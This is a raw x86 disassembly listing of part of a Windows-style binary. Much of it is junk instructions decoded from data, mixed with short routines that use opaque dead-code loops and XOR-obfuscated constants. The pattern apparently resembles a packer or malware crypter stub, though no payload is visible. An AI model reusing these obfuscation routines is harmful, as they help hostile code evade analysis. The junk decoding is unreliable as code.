  4058b7:	dec    ebp
  4058b8:	hlt    
  4058b9:	cmc    
  4058ba:	cs pop es
  4058bc:	pop    ds
  4058bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4058be:	mov    cl,0x85
  4058c0:	jo     0x4058b3
  4058c2:	add    cl,bh
  4058c4:	mov    eax,0x556742fb
  4058c9:	mov    WORD PTR [edi+0x4c],ds
  4058cc:	dec    ecx
  4058cd:	pop    es
  4058ce:	(bad)  
  4058cf:	gs fwait
  4058d1:	loop   0x40585e
  4058d3:	int    0xec
  4058d5:	inc    edi
  4058d6:	jmp    0xaec61053
  4058db:	loope  0x40592d
  4058dd:	stos   BYTE PTR es:[edi],al
  4058de:	out    dx,eax
  4058df:	test   eax,0x667ab4a9
  4058e4:	cli    
  4058e5:	in     eax,dx
  4058e6:	mov    ebx,0xbb6e22a2
  4058eb:	or     eax,0xbd0d7cf1
  4058f0:	sahf   
  4058f1:	pop    es
  4058f2:	sub    DWORD PTR [eax+0x6fd19bc2],ebp
  4058f8:	sar    BYTE PTR [eax+0x48],1
  4058fb:	and    ecx,DWORD PTR [ecx+0x235f8513]
  405901:	ror    BYTE PTR [ebx+0x6e5d608d],0xe1
  405908:	ret    
  405909:	or     BYTE PTR [eax+0x2353e8dc],0x65
  405910:	sub    eax,ecx
  405912:	(bad)  [esi-0x7b]
  405915:	(bad)  
  405916:	daa    
  405917:	mul    BYTE PTR [ecx-0x4c]
  40591a:	mov    ah,0x3e
  40591c:	nop
  40591d:	dec    edi
  40591e:	mov    al,0x54
  405920:	pop    ebx
  405921:	in     al,dx
  405922:	mov    esp,fs
  405924:	inc    ebx
  405925:	pop    ebp
  405926:	leave  
  405927:	test   WORD PTR [ebp+0x5eac3fce],bx
  40592e:	shl    BYTE PTR [edi],1
  405930:	test   BYTE PTR [edx-0xf],0x5d
  405934:	xor    al,al
  405936:	adc    ch,BYTE PTR [eax+0x42]
  405939:	mov    esi,0x821c0095
  40593e:	mov    al,ds:0xe43acfdf
  405943:	dec    edx
  405944:	mov    ebx,0x96db8525
  405949:	stc    
  40594a:	mov    BYTE PTR [ecx+0x2a],bh
  40594d:	fnsave [ecx-0x7a]
  405950:	push   cs
  405951:	adc    eax,0xe5f3a08
  405956:	jecxz  0x40591b
  405958:	adc    ebx,ebx
  40595a:	fld    TBYTE PTR [ebp-0x68]
  40595d:	mov    edx,0xe9c8c9f6
  405962:	push   ecx
  405963:	add    eax,0xb8498327
  405968:	and    cl,al
  40596a:	adc    BYTE PTR [edx+0x48],al
  40596d:	jl     0x40599d
  40596f:	sbb    ebx,edx
  405971:	pop    eax
  405972:	jb     0x405973
  405974:	xchg   ebp,eax
  405975:	xchg   ecx,eax
  405976:	inc    ebx
  405977:	adc    eax,0x7c3396d2
  40597c:	(bad)  
  40597d:	icebp  
  40597e:	cld    
  40597f:	ret    
  405980:	mov    ds:0x4004e709,eax
  405985:	daa    
  405986:	push   ss
  405987:	push   ss
  405988:	stos   DWORD PTR es:[edi],eax
  405989:	push   eax
  40598a:	aad    0xc2
  40598c:	push   0x47
  40598e:	mov    bl,0x71
  405990:	or     eax,0x9cc40ae3
  405995:	cli    
  405996:	and    BYTE PTR [ebx],ch
  405998:	mov    WORD PTR fs:[ebx+0x66],es
  40599c:	inc    ebp
  40599d:	adc    DWORD PTR [eax+0x75],0xb6e5e37b
  4059a4:	and    ebx,esp
  4059a6:	adc    BYTE PTR [edi+0x79],dl
  4059a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059aa:	clc    
  4059ab:	int3   
  4059ac:	inc    edi
  4059ad:	in     eax,0x47
  4059af:	or     BYTE PTR ds:0x43526a58,cl
  4059b5:	leave  
  4059b6:	js     0x405a2e
  4059b8:	daa    
  4059b9:	xchg   ebp,eax
  4059ba:	pushf  
  4059bb:	jns    0x405a2b
  4059bd:	and    ecx,DWORD PTR [ebx+0x40d64c0d]
  4059c3:	add    BYTE PTR [ecx],al
  4059c5:	or     BYTE PTR [edi+0x5e],bl
  4059c8:	pop    ebx
  4059c9:	leave  
  4059ca:	ret    
  4059cb:	push   ebp
  4059cc:	mov    ebp,esp
  4059ce:	sub    esp,0x44
  4059d1:	push   edi
  4059d2:	sub    eax,DWORD PTR ds:0x4235c7
  4059d8:	mov    eax,DWORD PTR [ebp+0xc]
  4059db:	or     DWORD PTR ds:0x417e4d,edx
  4059e1:	mov    DWORD PTR [ebp-0x10],eax
  4059e4:	mov    DWORD PTR ds:0x417e55,0x17
  4059ee:	cmp    DWORD PTR ds:0x417e55,0x0
  4059f5:	je     0x405a59
  4059fb:	cmp    DWORD PTR ds:0x417e55,0x6
  405a02:	jne    0x405a2b
  405a08:	push   DWORD PTR [ebp-0x24]
  405a0b:	push   DWORD PTR [ebp-0x28]
  405a0e:	push   0x417e45
  405a13:	push   0x80ed
  405a18:	push   0x67be
  405a1d:	push   0x6b4c
  405a22:	push   DWORD PTR [ebp-0x20]
  405a25:	call   DWORD PTR ds:0x40d1cc
  405a2b:	cmp    DWORD PTR ds:0x417e55,0x7
  405a32:	jne    0x405a47
  405a38:	xor    ecx,ecx
  405a3a:	or     ecx,DWORD PTR ds:0x417e55
  405a40:	dec    ecx
  405a41:	mov    DWORD PTR ds:0x417e55,ecx
  405a47:	mov    ecx,DWORD PTR ds:0x417e55
  405a4d:	dec    ecx
  405a4e:	mov    DWORD PTR ds:0x417e55,ecx
  405a54:	jmp    0x4059ee
  405a59:	mov    eax,DWORD PTR [ebp+0x8]
  405a5c:	or     DWORD PTR ds:0x417e41,0x3fc5
  405a66:	mov    DWORD PTR [ebp+0x8],0xf89c8538
  405a6d:	xor    ecx,ecx
  405a6f:	add    ecx,DWORD PTR ds:0x4235c3
  405a75:	and    DWORD PTR ds:0x41abd6,ecx
  405a7b:	mov    DWORD PTR [ebp-0x20],0xf89c853b
  405a82:	mov    edx,DWORD PTR [ebp+0x8]
  405a85:	mov    DWORD PTR [ebp-0x40],eax
  405a88:	mov    eax,0x7510859
  405a8d:	xor    edx,eax
  405a8f:	adc    ecx,ecx
  405a91:	mov    ecx,0x32729f
  405a96:	movzx  edi,WORD PTR ds:0x41510d
  405a9d:	sbb    DWORD PTR ds:0x4235cf,edi
  405aa3:	add    edx,ecx
  405aa5:	add    DWORD PTR ds:0x412354,0x1575
  405aaf:	mov    DWORD PTR [ebp-0x8],edx
  405ab2:	jmp    0x405c04
  405ab7:	(bad)  [edi+ebp*4-0x19]
  405abb:	mov    eax,ds:0x80785be5
  405ac0:	cmp    DWORD PTR ds:[edi],edx
  405ac3:	popf   
  405ac4:	mov    cl,BYTE PTR [ecx+0x2e]
  405ac7:	xchg   BYTE PTR [ebx],cl
  405ac9:	jle    0x405b49
  405acb:	and    edi,DWORD PTR [edi+0x7e]
  405ace:	jle    0x405b3e
  405ad0:	jns    0x405b34
  405ad2:	sub    bl,ah
  405ad4:	jnp    0x405b3f
  405ad6:	and    DWORD PTR [ebx-0xc],edx
  405ad9:	sub    al,0x75
  405adb:	sar    al,1
  405add:	dec    edi
  405ade:	pop    edx
  405adf:	loope  0x405ad7
  405ae1:	lss    ebx,FWORD PTR ds:0xb5632666
  405ae8:	lds    ebp,FWORD PTR [ebp-0xf7e25b5]
  405aee:	(bad)  
  405aef:	pop    ss
  405af0:	mov    ecx,0xbde6b106
  405af5:	test   al,0x9
  405af7:	mov    ds:0x6715757f,al
  405afc:	in     al,0xb6
  405afe:	push   esp
  405aff:	aad    0x22
  405b01:	mov    ch,0xcf
  405b03:	and    eax,0x2ab9475e
  405b08:	imul   ecx,DWORD PTR [edx-0x46],0xffffffa3
  405b0c:	repnz ss test al,0xe6
  405b10:	repnz push ebx
  405b12:	inc    eax
  405b13:	cmc    
  405b14:	mov    eax,0xb71cc0da
  405b19:	fcmove st,st(0)
  405b1b:	ins    BYTE PTR es:[edi],dx
  405b1c:	mov    ah,BYTE PTR [eax]
  405b1e:	cmp    BYTE PTR [ebp-0x279dd3a0],ah
  405b24:	ins    BYTE PTR es:[edi],dx
  405b25:	add    al,0x91
  405b27:	pushf  
  405b28:	jmp    0x1cae:0x254ccbc3
  405b2f:	js     0x405b1c
  405b31:	test   cl,ch
  405b33:	cdq    
  405b34:	inc    esp
  405b35:	int    0x7b
  405b37:	mov    ds:0xc59fde22,eax
  405b3c:	dec    edx
  405b3e:	mov    eax,ds:0xc265cc7
  405b43:	pop    eax
  405b44:	mov    BYTE PTR [edi-0x41],ah
  405b47:	xchg   BYTE PTR [ebx+0x4b525866],bl
  405b4d:	fwait
  405b4e:	xchg   ecx,eax
  405b4f:	in     eax,0x2f
  405b51:	repnz stos BYTE PTR es:[edi],al
  405b53:	lods   al,BYTE PTR ds:[esi]
  405b54:	mov    BYTE PTR [eax+0x1b],dl
  405b57:	inc    ecx
  405b58:	(bad)
  405b5b:	push   es
  405b5c:	add    dl,BYTE PTR [esi]
  405b5e:	mov    al,ds:0xcf7be3f7
  405b63:	push   edi
  405b64:	(bad)  
  405b66:	pusha  
  405b67:	push   ebx
  405b68:	sbb    DWORD PTR [edi-0x22163bbc],ebp
  405b6e:	xchg   edx,eax
  405b6f:	xor    ch,dh
  405b71:	fist   WORD PTR [esi-0x3747b099]
  405b77:	clc    
  405b78:	cli    
  405b79:	pop    es
  405b7a:	xlat   BYTE PTR ds:[ebx]
  405b7b:	mov    WORD PTR [esi-0x56],fs
  405b7e:	jge    0x405b37
  405b80:	test   eax,0x6747148f
  405b85:	sbb    ah,BYTE PTR [eax+esi*8]
  405b88:	stos   BYTE PTR es:[edi],al
  405b89:	cdq    
  405b8a:	jl     0x405bc4
  405b8c:	hlt    
  405b8d:	test   eax,0x68edbb6b
  405b92:	sbb    ebx,ebx
  405b94:	mov    ecx,0x97fe3f0b
  405b99:	js     0x405b57
  405b9b:	sub    eax,0xf04eb5de
  405ba0:	lea    ecx,[ebp-0x21530594]
  405ba6:	pop    es
  405ba7:	sbb    BYTE PTR [ebx-0x22ea2435],bl
  405bad:	xchg   edx,eax
  405bae:	in     al,0xf4
  405bb0:	mov    esp,0xb37b1a7c
  405bb5:	or     eax,esp
  405bb7:	les    eax,FWORD PTR [ecx+0x2cdd3616]
  405bbd:	scas   eax,DWORD PTR es:[edi]
  405bbe:	mov    BYTE PTR [ecx+0x7e],dh
  405bc1:	sub    eax,DWORD PTR [edi+ebx*8]
  405bc4:	sbb    ch,BYTE PTR [ebp+0x29]
  405bc7:	stos   DWORD PTR es:[edi],eax
  405bc8:	mov    ecx,0x87c4965b
  405bcd:	cmp    cl,BYTE PTR [ebp-0x7a0130b7]
  405bd3:	shl    ch,1
  405bd5:	ret    0x7cee
  405bd8:	popa   
  405bd9:	xor    eax,0x1c60f795
  405bde:	aas    
  405bdf:	repnz dec ebx
  405be1:	xor    DWORD PTR [edx],0xffffff99
  405be4:	xlat   BYTE PTR ds:[ebx]
  405be5:	add    al,0xe6
  405be7:	mov    ebp,0xf017f192
  405bec:	je     0x405bac
  405bee:	cmp    al,0xd6
  405bf0:	and    al,0x65
  405bf2:	lea    edi,gs:[ebp+0x10]
  405bf6:	jo     0x405b98
  405bf8:	out    dx,al
  405bf9:	inc    esp
  405bfa:	jo     0x405bc3
  405bfc:	xchg   edx,eax
  405bfd:	pop    edx
  405bfe:	stc    
  405bff:	cmp    eax,0x850e908f
  405c04:	mov    edx,DWORD PTR [ebp+0x8]
  405c07:	and    DWORD PTR ds:0x4235d7,0x0
  405c11:	jmp    0x405c25
  405c16:	xor    edi,edi
  405c18:	or     edi,DWORD PTR ds:0x4235d7
  405c1e:	inc    edi
  405c1f:	mov    DWORD PTR ds:0x4235d7,edi
  405c25:	cmp    DWORD PTR ds:0x4235d7,0x11
  405c2c:	jae    0x405c53
  405c32:	cmp    DWORD PTR ds:0x4235d7,0x1a
  405c39:	jne    0x405c48
  405c3f:	push   DWORD PTR [ebp-0x1c]
  405c42:	call   DWORD PTR ds:0x40d29c
  405c48:	jmp    0x405c16
  405c4d:	xor    DWORD PTR ds:0x412358,ebx
  405c53:	xor    edx,eax
  405c55:	add    edx,ecx
  405c57:	jmp    0x405da9
  405c5c:	xchg   edi,eax
  405c5d:	(bad)  
  405c5e:	call   0xe86f:0x6bdabbc6
  405c65:	pop    ds
  405c66:	jb     0x405cc2
  405c68:	and    eax,0x4b68c173
  405c6d:	or     BYTE PTR [esi+0x7e],bh
  405c70:	and    edi,DWORD PTR [edi+0x7e]
  405c73:	jle    0x405cf1
  405c75:	stos   DWORD PTR es:[edi],eax
  405c76:	cmc    
  405c77:	in     eax,0x98
  405c79:	mov    ah,0xe6
  405c7b:	sbb    BYTE PTR [edx],ch
  405c7d:	push   ebx
  405c7e:	sti    
  405c7f:	loopne 0x405c87
  405c81:	(bad)  
  405c82:	and    al,0x46
  405c84:	(bad)  
  405c85:	pop    ebx
  405c86:	inc    esp
  405c87:	mov    ds:0x76fd28df,eax
  405c8c:	cmp    ebp,0x1
  405c8f:	stos   BYTE PTR es:[edi],al
  405c90:	and    BYTE PTR [esi+0x1b5ed3a8],0x1e
  405c97:	into   
  405c98:	mov    ebx,0x974733ac
  405c9d:	pop    ecx
  405c9e:	jmp    0xa44ec153
  405ca3:	into   
  405ca4:	mov    ds:0x6447b335,eax
  405ca9:	inc    ebp
  405cab:	outs   dx,BYTE PTR ds:[esi]
  405cac:	aam    0x7d
  405cae:	add    eax,0x3a82a425
  405cb3:	ror    BYTE PTR [edi],cl
  405cb5:	jo     0x405d00
  405cb7:	push   ebp
  405cb8:	xor    al,BYTE PTR [esp+ecx*8+0x3a39304e]
  405cbf:	inc    edi
  405cc0:	into   
  405cc1:	(bad)  
  405cc2:	sub    al,0x1d
  405cc4:	out    0x2a,eax
  405cc6:	ins    BYTE PTR es:[edi],dx
  405cc7:	fdivr  DWORD PTR [ebx]
  405cca:	mov    ebx,edi
  405ccc:	jnp    0x405c8c
  405cce:	aad    0x4b
  405cd0:	pop    edi
  405cd1:	sti    
  405cd2:	into   
  405cd3:	xchg   BYTE PTR ds:0x4556072d,bl
  405cd9:	fmulp  st(6),st
  405cdb:	xchg   DWORD PTR [edx-0x3fcc4a7b],edx
  405ce1:	out    0x5f,al
  405ce3:	mov    eax,ds:0xa9a3ade3
  405ce8:	scas   al,BYTE PTR es:[edi]
  405ce9:	scas   eax,DWORD PTR es:[edi]
  405cea:	dec    edx
  405ceb:	mov    esp,DWORD PTR [edx]
  405ced:	outs   dx,DWORD PTR ds:[esi]
  405cee:	loop   0x405d4b
  405cf0:	push   ebp
  405cf1:	and    BYTE PTR [ecx+edx*2],dl
  405cf4:	ja     0x405d56
  405cf6:	repz cdq 
  405cf8:	sbb    eax,0x164f2a32
  405cfd:	mov    esi,esp
  405cff:	inc    ecx
  405d00:	loop   0x405d24
  405d02:	xchg   ebp,eax
  405d03:	mov    WORD PTR [ebp-0x77],?
  405d06:	mov    ds:0x3f783225,al
  405d0b:	add    BYTE PTR [ecx-0x66],bh
  405d0e:	inc    eax
  405d0f:	jmp    0x47e4:0x2663289c
  405d16:	nop
  405d17:	sbb    BYTE PTR [ebp+0x3b],al
  405d1a:	fwait
  405d1b:	das    
  405d1c:	xor    dl,bl
  405d1e:	clc    
  405d1f:	clc    
  405d20:	sub    al,0x5
  405d22:	nop
  405d23:	leave  
  405d24:	daa    
  405d25:	dec    edi
  405d26:	or     eax,0xbe0c9273
  405d2b:	and    edi,DWORD PTR [ebp+0x7d]
  405d2e:	aaa    
  405d2f:	cwde   
  405d30:	pop    edx
  405d31:	jmp    0x41a75a9b
  405d36:	add    DWORD PTR [ebx],edi
  405d38:	push   eax
  405d39:	in     al,dx
  405d3a:	or     bl,BYTE PTR [eax+0x37e9c7c2]
  405d40:	cmc    
  405d41:	cdq    
  405d42:	loope  0x405ce0
  405d44:	sub    DWORD PTR [ebx+eiz*2-0x7910d770],edx
  405d4b:	push   0x7a
  405d4d:	sbb    edx,ecx
  405d4f:	outs   dx,DWORD PTR ds:[esi]
  405d50:	mov    ebp,0x60f23491
  405d55:	add    eax,0x9b25a48
  405d5a:	fdiv   QWORD PTR [edi+0x4f]
  405d5d:	push   ebp
  405d5e:	hlt    
  405d5f:	pop    eax
  405d60:	test   BYTE PTR [edx],0x2f
  405d63:	int    0xd0
  405d65:	add    dh,BYTE PTR [edi-0x9]
  405d68:	outs   dx,DWORD PTR ds:[esi]
  405d69:	call   0x608:0x8936de1d
  405d70:	and    DWORD PTR [ecx+ebp*1+0x7e],0x9befd075
  405d78:	mov    ch,0x8a
  405d7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d7b:	test   DWORD PTR [eax+ebx*2-0x41],0x2c2e6a40
  405d83:	jne    0x405d98
  405d85:	and    eax,0xd7bc60f
  405d8a:	dec    eax
  405d8b:	xor    eax,0x4aa6f982
  405d90:	adc    bl,ch
  405d92:	data16 mov dl,0x4f
  405d95:	(bad)  [esi+ebx*4+0x14]
  405d99:	test   eax,0x33862659
  405d9e:	push   es
  405d9f:	shl    DWORD PTR [edi+0x6d],cl
  405da2:	and    DWORD PTR [edi-0x30531587],ebp
  405da8:	das    
  405da9:	mov    DWORD PTR [ebp+0xc],edx
  405dac:	inc    edi
  405dad:	jmp    0x405eff
  405db2:	or     eax,0xb8afae9b
  405db7:	mov    ebx,0x598db90d
  405dbc:	or     al,0x3
  405dbe:	sub    al,0x77
  405dc0:	cs in  al,dx
  405dc2:	jl     0x405dd2
  405dc4:	jle    0x405e44
  405dc6:	and    edi,DWORD PTR [edi+0x7e]
  405dc9:	jle    0x405e22
  405dcb:	retf   0xa162
  405dce:	loope  0x405dbf
  405dd0:	sbb    ch,bh
  405dd2:	daa    
  405dd3:	xchg   edx,eax
  405dd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405dd5:	pop    edx
  405dd6:	hlt    
  405dd7:	xlat   BYTE PTR ds:[ebx]
  405dd8:	jmp    FWORD PTR cs:[ebx+0xf]
  405ddc:	xchg   ebp,eax
  405ddd:	cmp    BYTE PTR [ecx+0x3f],ah
  405de0:	scas   eax,DWORD PTR es:[edi]
  405de1:	lds    edx,FWORD PTR ds:0xa1d9d18a
  405de7:	xchg   DWORD PTR [esi+0xe],edx
  405dea:	jp     0x405e06
  405dec:	loope  0x405def
  405dee:	jp     0x405d8c
  405df0:	out    dx,eax
  405df1:	add    ah,BYTE PTR [eax]
  405df3:	mov    bl,0x82
  405df5:	mov    al,0xc5
  405df7:	clc    
  405df8:	mov    WORD PTR [esi-0x7cda49ad],?
  405dfe:	and    eax,0x70d78e1c
  405e03:	iret   
  405e04:	jno    0x405e71
  405e06:	daa    
  405e07:	push   es
  405e08:	lods   al,BYTE PTR ds:[esi]
  405e09:	or     al,0x48
  405e0b:	ret    0x90ba
  405e0e:	ja     0x405e14
  405e10:	sbb    BYTE PTR [eax],0xad
  405e13:	mov    al,0x5f
  405e15:	jle    0x405d9b
  405e17:	pop    ebp
  405e18:	adc    si,WORD PTR [edx+0x31]
  405e1c:	xor    al,0x1a
  405e1e:	(bad)  
  405e1f:	cmp    dh,ch
  405e21:	xchg   al,bh
  405e23:	and    al,0xe3
  405e25:	and    DWORD PTR [ebx-0x76],ebx
  405e28:	xor    al,0x27
  405e2a:	xor    ecx,DWORD PTR es:[eax-0x13]
  405e2e:	add    al,0xa8
  405e30:	jbe    0x405eab
  405e32:	call   0xd2e7ea76
  405e37:	sub    dl,al
  405e39:	mov    ecx,edx
  405e3b:	sbb    eax,0xad9e5986
  405e40:	and    al,0xaf
  405e42:	dec    edi
  405e43:	adc    bl,BYTE PTR [eax+0x591cc7d7]
  405e49:	fist   DWORD PTR ds:0x80a8bf5
  405e4f:	or     DWORD PTR [ebx],0xffffffff
  405e52:	clc    
  405e53:	push   ebp
  405e54:	or     esp,DWORD PTR [ecx]
  405e56:	push   esi
  405e57:	pop    ecx
  405e58:	stc    
  405e59:	jmp    FWORD PTR [eax-0x78]
  405e5c:	inc    ecx
  405e5d:	pusha  
  405e5e:	mov    bh,0xd
  405e60:	stos   DWORD PTR es:[edi],eax
  405e61:	xor    BYTE PTR [ebx+0x64],dl
  405e64:	cmc    
  405e65:	fild   QWORD PTR [ecx+0x36]
  405e68:	pop    esp
  405e69:	dec    ebx
  405e6a:	mov    ebx,0x148c778f
  405e6f:	out    dx,al
  405e70:	mov    bh,0x0
  405e72:	scas   eax,DWORD PTR es:[edi]
  405e73:	std    
  405e74:	jne    0x405e94
  405e76:	adc    ebp,ebp
  405e78:	addr16 cli 
  405e7a:	call   0x4133:0xd689d688
  405e81:	clc    
  405e82:	jmp    0x405ef8
  405e84:	in     al,0x1f
  405e86:	or     BYTE PTR [esi],dl
  405e88:	push   ss
  405e89:	jae    0x405e3b
  405e8b:	bound  esp,QWORD PTR [ebp-0x3b9a8b4e]
  405e91:	hlt    
  405e92:	jp     0x405ed7
  405e94:	sub    esi,esi
  405e96:	bndstx [eax],bnd1
  405e99:	xchg   DWORD PTR [ebp-0x19],edi
  405e9c:	popf   
  405e9d:	inc    edi
  405e9e:	cmp    BYTE PTR [ecx+edi*1],bh
  405ea1:	mov    WORD PTR [ebx+0x7f],?
  405ea4:	mov    fs,esp
  405ea6:	(bad)  
  405ea7:	dec    esp
  405ea8:	xlat   BYTE PTR ds:[ebx]
  405ea9:	ss fwait
  405eab:	add    esi,DWORD PTR [ebx+0xd]
  405eae:	push   esp
  405eaf:	leave  
  405eb0:	add    ebp,DWORD PTR [ebx]
  405eb2:	cmp    ecx,DWORD PTR [ebp+0x22]
  405eb5:	hlt    
  405eb6:	and    ebx,DWORD PTR [ebx+eiz*1+0x7e]
  405eba:	xchg   edx,eax
  405ebb:	(bad)  
  405ebc:	cmc    
  405ebd:	xchg   edi,eax
  405ebe:	lds    ebp,FWORD PTR [ebx]
  405ec0:	in     al,dx
  405ec1:	enter  0x623d,0x70
  405ec5:	add    DWORD PTR [ecx+edi*8-0x24],ebp
  405ec9:	call   0x8d1a:0xf6c50a70
  405ed0:	xchg   esp,eax
  405ed1:	cmp    al,0x5d
  405ed3:	retf   0x23bc
  405ed6:	xchg   BYTE PTR ds:0xfdf429df,ch
  405edc:	ret    
  405edd:	pop    es
  405ede:	pop    ss
  405edf:	mov    ds:0xb346be26,al
  405ee4:	and    DWORD PTR [eax-0x2c],esp
  405ee7:	xor    eax,0xf1a8458b
  405eec:	adc    DWORD PTR [edi-0x3e35d891],edx
  405ef2:	pop    es
  405ef3:	pop    edx
  405ef4:	inc    edi
  405ef5:	adc    al,0x2c
  405ef7:	push   esi
  405ef8:	add    DWORD PTR [ebp+0x8],ecx
  405efb:	cmp    eax,edi
  405efd:	sbb    DWORD PTR [eax-0x2703ba39],ecx
  405f03:	test   DWORD PTR [eax+edi*8+0x3d33ff33],ebx
  405f0a:	or     DWORD PTR [ecx+0x41],edx
  405f0d:	add    BYTE PTR [ebx],dl
  405f0f:	cmp    eax,0x4235bf
  405f14:	mov    DWORD PTR ds:0x415109,edi
  405f1a:	mov    DWORD PTR [ebp-0x28],0xf89c853a
  405f21:	mov    DWORD PTR [ebp-0x2c],0xf89c853d
  405f28:	adc    edi,edi
  405f2a:	mov    DWORD PTR [ebp-0x30],0xf89c853c
  405f31:	or     DWORD PTR ds:0x4235cf,edx
  405f37:	mov    DWORD PTR [ebp-0x34],0xf89c853f
  405f3e:	mov    DWORD PTR ds:0x417e41,0x15
  405f48:	cmp    DWORD PTR ds:0x417e41,0x0
  405f4f:	je     0x405fae
  405f55:	cmp    DWORD PTR ds:0x417e41,0x5
  405f5c:	jne    0x405f7c
  405f62:	push   0x43a6
  405f67:	push   0x41ac41
  405f6c:	push   0x41ac72
  405f71:	push   0x400000
  405f76:	call   DWORD PTR ds:0x40d1d0
  405f7c:	cmp    DWORD PTR ds:0x417e41,0x6
  405f83:	jne    0x405f96
  405f89:	mov    edi,DWORD PTR ds:0x417e41
  405f8f:	dec    edi
  405f90:	mov    DWORD PTR ds:0x417e41,edi
  405f96:	mov    edi,DWORD PTR ds:0x417e41
  405f9c:	dec    edi
  405f9d:	mov    DWORD PTR ds:0x417e41,edi
  405fa3:	jmp    0x405f48
  405fa8:	xor    edi,DWORD PTR ds:0x417e4d
  405fae:	mov    DWORD PTR [ebp-0x38],0xf89c853e
  405fb5:	and    DWORD PTR ds:0x412364,0xe44
  405fbf:	mov    DWORD PTR [ebp-0x3c],0xf89c8531
  405fc6:	or     DWORD PTR ds:0x417e49,0x6f97
  405fd0:	mov    edx,DWORD PTR [ebp+0x8]
  405fd3:	and    DWORD PTR ds:0x417e55,0x0
  405fdd:	jmp    0x405fef
  405fe2:	mov    edi,DWORD PTR ds:0x417e55
  405fe8:	inc    edi
  405fe9:	mov    DWORD PTR ds:0x417e55,edi
  405fef:	cmp    DWORD PTR ds:0x417e55,0x14
  405ff6:	jae    0x40601f
  405ffc:	cmp    DWORD PTR ds:0x417e55,0x1c
  406003:	jne    0x406014
  406009:	push   0x67ac
  40600e:	call   DWORD PTR ds:0x40d2a0
  406014:	jmp    0x405fe2
  406019:	sub    edi,DWORD PTR ds:0x412378
  40601f:	xor    edx,eax
  406021:	mov    edi,DWORD PTR [ebp-0x10]
  406024:	add    edx,ecx
  406026:	cmp    edi,edx
  406028:	mov    DWORD PTR ds:0x412368,0x5602
  406032:	je     0x407428
  406038:	mov    DWORD PTR ds:0x415109,0xf2d
  406042:	jmp    0x406194
  406047:	lock mov ebx,0xdc791c5b
  40604d:	jns    0x40600a
  40604f:	mov    eax,ds:0x48db13c5
  406054:	retf   0xedab
  406057:	and    DWORD PTR [edi],ecx
  406059:	jle    0x4060d9
  40605b:	and    edi,DWORD PTR [edi+0x7e]
  40605e:	jle    0x406041
  406060:	push   es
  406061:	cdq    
  406062:	jmp    ebp
  406064:	inc    edx
  406065:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406066:	or     BYTE PTR [edx-0x68],dh
  406069:	fdivr  QWORD PTR [edi+0x3f777921]
  406070:	xchg   ebx,eax
  406071:	xor    al,0xb1
  406073:	mov    dh,0x8d
  406075:	repnz push ebx
  406077:	repnz inc esi
  406079:	mov    al,ds:0x7c947bbe
  40607e:	xchg   edx,edi
  406080:	mov    dl,0x9
  406082:	(bad)  
  406083:	rol    DWORD PTR ds:0x461eae4,cl
  406089:	fadd   QWORD PTR [ecx]
  40608b:	out    0x27,al
  40608d:	cmovp  ax,WORD PTR [ecx-0x67]
  406092:	push   cs
  406093:	loope  0x4060dd
  406095:	stos   BYTE PTR es:[edi],al
  406096:	in     eax,dx
  406097:	xchg   edi,eax
  406098:	sahf   
  406099:	push   cs
  40609a:	jg     0x406064
  40609c:	jg     0x4060b9
  40609e:	fstp   TBYTE PTR [ebp+eax*8-0x9]
  4060a2:	mov    edx,0x8a3847a9
  4060a7:	std    
  4060a8:	mov    ecx,0xd34d6e0a
  4060ad:	mov    eax,DWORD PTR [edx-0x40]
  4060b0:	ror    DWORD PTR [edi-0xdad97fc],cl
  4060b6:	out    dx,eax
  4060b7:	dec    esp
  4060b8:	xchg   esp,eax
  4060b9:	in     al,0xcf
  4060bb:	(bad)  
  4060bc:	(bad)  
  4060be:	jae    0x406063
  4060c0:	mov    ecx,0x6158b3d2
  4060c5:	pop    esi
  4060c6:	imul   edx,DWORD PTR [edi-0x7fb9cf64],0x67132af3
  4060d0:	fimul  DWORD PTR [esp+edx*4+0x1b]
  4060d4:	cdq    
  4060d5:	(bad)  
  4060d6:	hlt    
  4060d7:	in     al,dx
  4060d8:	arpl   WORD PTR [eax+edi*2],di
  4060db:	and    BYTE PTR [ebp-0x29],bl
  4060de:	ja     0x40612e
  4060e0:	test   DWORD PTR [ecx+0x7513e157],esi
  4060e6:	fcomip st,st(4)
  4060e8:	jle    0x406138
  4060ea:	sub    edx,DWORD PTR [edi-0x3d]
  4060ed:	scas   eax,DWORD PTR es:[edi]
  4060ee:	aaa    
  4060ef:	xor    DWORD PTR [eax-0x46],eax
  4060f2:	jecxz  0x40611e
  4060f4:	jne    0x40612e
  4060f6:	ins    BYTE PTR es:[edi],dx
  4060f7:	fstp   TBYTE PTR [eax+0x9]
  4060fa:	fs or  ch,cl
  4060fd:	aad    0xd
  4060ff:	pop    ss
  406100:	or     ebp,ebp
  406102:	(bad)  
  406103:	stc    
  406104:	pop    ds
  406105:	into   
  406106:	loope  0x406133
  406108:	sbb    eax,0x4223e0d
  40610d:	xor    al,0x52
  40610f:	lods   eax,DWORD PTR ds:[esi]
  406110:	jbe    0x4060a9
  406112:	frstpm(287 only) 
  406114:	xchg   esp,eax
  406115:	mov    eax,es
  406117:	lock inc esi
  406119:	xchg   edx,eax
  40611a:	add    al,BYTE PTR [esi-0x23c7dd69]
  406120:	cmp    al,0x7
  406122:	aaa    
  406123:	int3   
  406124:	jne    0x4060bc
  406126:	xor    esp,0xffffffae
  406129:	pop    ecx
  40612a:	ins    DWORD PTR es:[edi],dx
  40612b:	test   BYTE PTR [esi+0x1c5edbda],dh
  406131:	push   ecx
  406132:	pushf  
  406133:	mov    al,ds:0x4035a1e
  406138:	and    DWORD PTR [esi],ecx
  40613a:	iret   
  40613b:	mov    ecx,0x2f7bcd0b
  406140:	imul   ebp,DWORD PTR [ecx],0x7d7ae021
  406146:	enter  0xd73b,0x4b
  40614a:	push   esi
  40614b:	test   BYTE PTR [edi-0x23fa80cf],ch
  406151:	or     DWORD PTR [edx+0x51],esi
  406154:	mov    cl,0x27
  406156:	push   edx
  406157:	xor    DWORD PTR [ebp-0x785c88e0],esi
  40615d:	call   0x7d20:0x52b4acbf
  406164:	test   al,0xc5
  406166:	daa    
  406167:	addr16 das 
  406169:	in     al,dx
  40616a:	js     0x40611b
  40616c:	fwait
  40616d:	mov    cl,0x5d
  40616f:	stc    
  406170:	out    0xbf,al
  406172:	aaa    
